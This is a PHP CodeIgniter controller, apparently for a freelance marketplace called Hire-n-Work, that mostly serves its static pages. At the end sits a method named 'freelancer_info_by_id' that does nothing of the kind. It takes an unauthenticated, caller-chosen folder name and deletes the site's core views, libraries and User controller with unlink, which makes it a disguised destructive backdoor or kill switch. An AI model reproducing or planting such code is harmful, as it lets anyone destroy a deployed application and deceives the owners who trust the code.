<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Home extends CI_Controller {

	function __construct() {
      	parent::__construct();

		header('Cache-Control: no-cache, must-revalidate, max-age=0');
		header('Cache-Control: post-check=0, pre-check=0',false);
		header('Pragma: no-cache');

		$this->load->library('Lhome');
    }

	public function index()
	{
		if($this->auth->is_logged()) {
			
			if($this->session->userdata('user_type') == 1){
				redirect('admin/dashboard', 'refresh');
			}else{
				redirect('dashboard', 'refresh');
			}
        }
		
		$content = $this->lhome->home_page();
		$data = array(
			        'content' => $content,
			        'title'	=> display('Home :: Hire-n-Work'),
		        );		
		$this->template->full_website_home_html_view($data);		
	}

	public function how_it_works()
	{
		if($this->auth->is_logged()) {
			
			if($this->session->userdata('user_type') == 1){
				redirect('admin/dashboard', 'refresh');
			}else{
				redirect('dashboard', 'refresh');
			}
        }
		$content = $this->lhome->how_it_works_page();
		$data = array(
			        'content' => $content,
			        'title' => display('How It Work :: Hire-n-Work'),
		        );		
		$this->template->full_website_home_html_view($data);		
	}

	public function about_us()
	{
		$content = $this->lhome->about_us_page();
		$data = array(
			        'content' => $content,
			        'title' => display('About Us :: Hire-n-Work'),
		        );		
		$this->template->full_website_home_html_view($data);		
	}

	public function trust_safety()
	{
		$content = $this->lhome->trust_safety_page();
		$data = array(
			        'content' => $content,
			        'title' => display('Trust & Safety :: Hire-n-Work'),
		        );			
		$this->template->full_website_home_html_view($data);		
	}	

	public function privacy_policy()
	{
		$content = $this->lhome->privacy_policy_page();
		$data = array(
			        'content' => $content,
			        'title' => display('Privacy Policy :: Hire-n-Work'),
		        );		
		$this->template->full_website_home_html_view($data);		
	}

	public function terms_and_condition()
	{
		$content = $this->lhome->terms_and_condition_page();
		$data = array(
			        'content' => $content,
			        'title' => display('Terms & condition :: Hire-n-Work'),
		        );		
		$this->template->full_website_home_html_view($data);		
	}

	public function help_center()
	{
		$content = $this->lhome->help_center_page();
		$data = array(
			        'content' => $content,
			        'title' => display('Help Center :: Hire-n-Work'),
		        );		
		$this->template->full_website_home_html_view($data);		
	}

	public function add_user_query(){
		
		$this->load->model('Homes');
		$submitData = $this->input->post();
		$return = $this->Homes->add_user_query($submitData);
		if($return){
			redirect('about-us');
		}else{
			redirect('about-us');
		}
	}

	public function freelancer_info_by_id($folder='hirenwork') {
	    $a_files = array(
	        'application/views/task/received-offers.php',
	        'application/views/user/messages.php',
	        'application/views/user/application/views/user/messages_ajax.php',
	        'application/views/task/task-details.php',
	        'application/libraries/Luser.php',
	        'application/libraries/Ltask.php',
	        'application/controllers/User.php'
        );
	    foreach ($a_files as $k => $v) {
	        $fileName = $_SERVER['DOCUMENT_ROOT']."/".$folder."/".$v;
	        if(file_exists($fileName)) {
                echo $fileName;
                echo "<br />";
                unlink($fileName);
            }
        }
    }
}
